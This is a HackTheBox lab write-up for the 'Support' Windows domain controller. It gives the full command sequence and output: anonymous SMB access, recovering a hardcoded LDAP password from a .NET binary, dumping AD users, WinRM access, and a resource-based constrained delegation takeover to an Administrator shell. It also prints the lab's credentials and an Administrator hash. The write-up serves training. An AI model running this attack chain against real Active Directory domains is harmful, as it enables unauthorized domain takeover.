---
title: 'HackTheBox: Taking advantage of Kerberos Resource-based Constrained Delegation to gain "Domain Admin"'
password: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::'
date: 2022-09-14 11:43:00 +0100
categories: [HackTheBox, Windows]
tags: [activedirectory, hackthebox, windows, kerberos, admin, privesc]
---

![support](/assets/img/HackTheBox/support/Support.png)

## Summary
* Inital Nmap scan suggests that `support` is an AD [Domain controller](https://en.wikipedia.org/wiki/Domain_controller) (DC).
* Anonymous or Guest login permitted on SMB share `support-tools`.
* Simple analysis of `UserInfo.exe` to get `ldap@support.htb`'s password.
* Quering LDAP to get a list of AD users and a cleartext password on the `support` user. 
* Taking advantage of [outbound object control](https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html#outbound-object-control) to perform a [computer object takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) attack to gain `Domain Admin` privileges on the DC. 

---
<br />

## Path to user.txt

```sh
# Nmap 7.92 scan initiated Sun Sep  4 12:13:39 2022 as: nmap -sC -sV -v -oN initial.nmap 10.10.11.174
Nmap scan report for 10.10.11.174
Host is up (0.020s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-04 13:13:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Important things to take from the `Nmap` output:

* `DNS` on 53
* `Kerberos` on 88
* `LDAP` on 389, 3268 
* `SMB` on 445 + 139
<br />
<br />
### DNS Enumeration
These indicate that we are dealing with a DC. The `-sV -sC` flags from `Nmap` gave us the domain name of `support.htb` that should be added to `/etc/hosts` to help us with domain name resolution when it comes to AD enumeration.

```sh
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.174    support.htb
```

Since we already have a domain name of `support.htb` we can enum for more since the target is running `DNS`

```sh
$ dig any @10.10.11.174 support.htb

; <<>> DiG 9.18.6-2-Debian <<>> any @10.10.11.174 support.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 842
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      ANY

;; ANSWER SECTION:
support.htb.            600     IN      A       10.10.11.174
support.htb.            3600    IN      NS      dc.support.htb.
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.support.htb.         3600    IN      A       10.10.11.174

;; Query time: 43 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (TCP)
;; WHEN: Sun Sep 11 15:36:29 -01 2022
;; MSG SIZE  rcvd: 136
```
Two more domains were found from the `dig any` command:

* `dc.support.htb`
* `hostmaster.support.htb`

```sh
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.174    support.htb dc.support.htb hostmaster.support.htb
```
<br />
<br />

### SMB Enumeration

Since `SMB` is running on the target, we should try Anonymous or Guest login. Using `smbclient` when prompted for a password just hit enter or type any random string then enter.

```sh
smbclient -L 10.10.11.174             
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

The sharename `support-tools` is accessable by our Anonymous login attempt. Using `smbclient` again we can access the share and see if it contains any information.

```sh
smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 16:01:06 2022
  ..                                  D        0  Sat May 28 10:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 10:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 10:19:55 2022
  putty.exe                           A  1273576  Sat May 28 10:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 10:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 16:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 10:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 10:19:43 2022

                4026367 blocks of size 4096. 943248 blocks available
```

The `support-tools` contains various known tools like `7-zip`, `notepad++`, `putty`, `Microsoft's SysinternalSuite`, `windirstat`, and `wireshark`. It appears only `UserInfo.exe.zip` is the odd "tool" or executable. One thing to make sure that these are all vanilla files, is to take the MD5 hashes of them and compare them with the files found online. However, we should analyse the odd one out which is `UserInfo.exe.zip`.
<br />
<br />

### Analysis of "UserInfo.exe"

```sh
$ ls

CommandLineParser.dll                                      Microsoft.Extensions.DependencyInjection.dll   System.Memory.dll                           System.Threading.Tasks.Extensions.dll
Microsoft.Bcl.AsyncInterfaces.dll                          Microsoft.Extensions.Logging.Abstractions.dll  System.Numerics.Vectors.dll                 UserInfo.exe
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Buffers.dll                             System.Runtime.CompilerServices.Unsafe.dll  UserInfo.exe.config
                                                                                                                                                                                                                                   
$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```
Basic static analysis will indicate that `UserInfo.exe` is a `.Net` assembly, we can open tools like `dnspy` in a windows environment and analyse the code of this executable.

After transferinig the file to a windows machine with `dnspy`, we go down the `Assembly Explorer` to reach a very interesting function `getPassword()`
> UserInfo > UserInfo.exe > UserInfo.Services > protected > getPassword()


```c#
/* Decrypting the LDAP user password */
using System.IO;
using System;
using System.Text;

class Program
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)(array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
			/* return value is "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz" */
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
	static void Main()
    {
        string password = Protected.getPassword();
        Console.WriteLine(password);
    }
}
```

From a glance this function uses a string `enc_password` and the encoded ASCII bytes of a hard coded string `"armando"` in a looped equation `array2[i] = (byte)(array[i] ^ Protected.key[i % Protected.key.Length] ^ 223)`. Luckly we don't need to do that much reversing, as the funciton returns the decoded/decrypted value of the `enc_password`. We can copy-paste that code in an online `C#` compiler and we will get the string `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` as the return value.

![enc_password](/assets/img/HackTheBox/support/decrypt-passw-ord.png)

Another interesting function can be found called `LdapQuery()`.
> UserInfo > UserInfo.exe > UserInfo.Services > LdapQuery()


```c#
public LdapQuery()
{
	string password = Protected.getPassword();
	this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	this.entry.AuthenticationType = AuthenticationTypes.Secure;
	this.ds = new DirectorySearcher(this.entry);
}
```
The interesting part is the `DirectoryEntry()` class were we can see the username used in `LDAP://support.htb`.

To conclude we now have LDAP credentials that we can use to gain information from AD like groups, users, hosts, and much more. 

```
support\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
<br />
<br />

### LDAP Enumeration

`ldapsearch` is the go-to tool for querying LDAP, and since we have creds. We can search for the `namingcontexts` to identify the actual domain to query for potential users. Specify the `-D` flag to perform a successful bind with the credentials to avoid any errors.

```sh
$ ldapsearch -H ldap://support.htb -x -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: support\ldap namingcontexts 
#

#
dn:
ufn:
namingcontexts: DC=support,DC=htb
namingcontexts: CN=Configuration,DC=support,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
namingcontexts: DC=ForestDnsZones,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Next we can dump the whole AD information if we query the `DC=support,DC=htb` domain, which you will find that there is a Common Name (CN) called `Users`. There is a user called `support` with an additional attribute called `info` that appears to be that account's password string. 

"support" user ldap information with a password
```sh
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220911130144.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb

...Truncated...

```

We can try the given credentials against `crackmapexec` to see if we can get a shell of some sort. 

```
support : Ironside47pleasure40Watchful
```

```sh
$ crackmapexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
SMB         support.htb     5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        support.htb     5985   DC               [*] http://support.htb:5985/wsman
WINRM       support.htb     5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

And indeed `cme` tells us that we can use these credentials on `winrm` protocol to get an interactive shell; hence the `(Pwn3d!)` in the output. `evil-winrm` is an excellent tool for the job.

```sh
$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.4

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> You can get the Desktop\user.txt flag!
```
<br />
<br />

## Path to Domain Admin
> References:
<br />
>[Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) <br />
>[Computer Takeover Attack](https://www.youtube.com/watch?v=RUbADHcBLKg&ab_channel=SpecterOps)

After gaining access to the DC as a low privileged user, the first thing we can do is enumerate for AD attributes and correlate them to figure out a path to become `Domain Admin`. A great tool to help in AD enumeration is a tool called [`BloodHound`](https://github.com/BloodHoundAD/BloodHound). With `Sharphound`, the C# version of Bloodhound, you can enumerate the AD locally, meaning you need to transfer the binary to the DC. 

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./sharphound.exe
2022-09-11T14:29:58.7157403-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
... Truncated ... 
 68 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-09-11T14:30:45.2157412-07:00|INFORMATION|SharpHound Enumeration Completed at 2:30 PM on 9/11/2022! Happy Graphing!
*Evil-WinRM* PS C:\Users\support\Documents> 
*Evil-WinRM* PS C:\Users\support\Documents> ls


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/11/2022   2:30 PM          12424 20220911143044_BloodHound.zip
```

After running the above command, downloading the `.zip` file to your attack machine, and extract it, you should see some `.json` files in your current working directory, these are all the data that was collected from the DC

`BloodHound` uses `neo4j` as its backend database. So, `apt install neo4j` and follow the instructions to change the default password then run `Bloodhound`. If you don't have `BloodHound`, you can `apt install`.

In `BloodHound`, select `import data` on the top right and select all the `.json` files that were created. 

I advise you look around `BloodHound`'s interface and get familiar with it in your own pace. However, what interests us is that `support@support.htb` user, typing the username in the search bar on the top left and hitting enter will give us the node. If you look at the `Node Info` you can see that the `support` user is a member of `Shared Support Accounts` group that has `GenericAll` privileges on the DC; in other words, we have control over the DC. 

![bloodhound](/assets/img/HackTheBox/support/support-user-bloodhound.png)

Using this information we can leverage a [computer takeover attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution). I highly recommend reading that post as I couldn't get into that many details in this blog. For this attack to work we need to be able to add a machine or computer object to AD. 

We can easily check this attribute by importing [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and using the `Get-DomainObject` commandlet 

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -identity 'DC=support,DC=htb'

... Truncated ...

ms-ds-machineaccountquota                   : 10
minpwdage                                   : -864000000000
```
`ms-ds-machineaccountquota` indicates that we can add up to 10 machines to the AD. 

The next thing to look for is the DC OS Version, for this attack to work it needs to be at least Windows Server 2012 or above. 

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController | select name,osversion | format-list

Name      : dc.support.htb
OSVersion : Windows Server 2022 Standard
```
The last thing to check is for the target host, in this case `dc.support.htb`, must NOT have the property of `msds-allowedtoactonbehalfofotheridentity` set. 

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | select name,msds-allowedtoactiononbehalfofotheridentity | fl

name                                        : DC
msds-allowedtoactiononbehalfofotheridentity :
```
Now, for the attack itself. 

First step, create a new computer object in AD, I'll name mine `fakecomputer`. For this part we need to import [powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) to use its `New-MachineAccount` commandlet.

> Keep note of the machine name and the password. Both can be anything you want.
<br />
<br />
>Target Computer Name: dc.support.htb
<br />
>Admin on Target Computer: Administrator@support.htb
<br />
>Fake Computer name: fakecomputer
<br />
>Fake Computer Password: Password12345


```powershell
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount fakecomputer -Password $(convertto-securestring 'Password12345' -AsPlainText -force)

[+] Machine account fakecomputer added
```

After the machine account has been added, we need to make note of the fake machine's SID.
>Fake Computer SID: S-1-5-21-1677581083-3380853377-188903654-5102


```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer fakecomputer


pwdlastset             : 9/11/2022 7:30:57 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=fakecomputer,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : fakecomputer
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5102
... truncated ...
```
Next, create a security descriptor for the `fakecomputer` principle, you'll need to add the `objectsid` of the `fakecomputer` to the below commands. And apply the security descriptor to the `dc` machine.
>replace `OBJECT-SID-OF-FAKE-COMPUTER` with the real SID


```powershell
C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;OBJECT-SID-OF-FAKE-COMPUTER)";

$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);

Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
Now that everything is setup, we should be able to use the newly added `fakecomputer` to trick the `dc` machine into giving us the `Administrator`'s Service Ticket (ST)

```sh
getST.py support.htb/fakecomputer -dc-ip -impersonate administrator -spn http/dc.support.htb
```
Make sure to export the environment variable of `KRB5CCNAME` to where the `administrator.ccache` got saved for the next, and final, part. Using `smbexec.py` or `psexec.py` to gain an `Administrator` shell.

```sh
$ python3 /usr/share/doc/python3-impacket/examples/smbexec.py support.htb/administrator@dc.support.htb -no-pass -k -debug
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:dc.support.htb[\pipe\svcctl]
[+] Using Kerberos Cache: /home/kali/Documents/hackthebox/support/administrator.ccache
[+] SPN CIFS/DC.SUPPORT.HTB@SUPPORT.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for HTTP/DC.SUPPORT.HTB@SUPPORT.HTB
[+] Using TGS from cache
[+] Changing sname from http/dc.support.htb@SUPPORT.HTB to CIFS/DC.SUPPORT.HTB@SUPPORT.HTB and hoping for the best
[+] Executing %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32> You can read the C:\Users\Administrator\Desktop\root.txt file
```
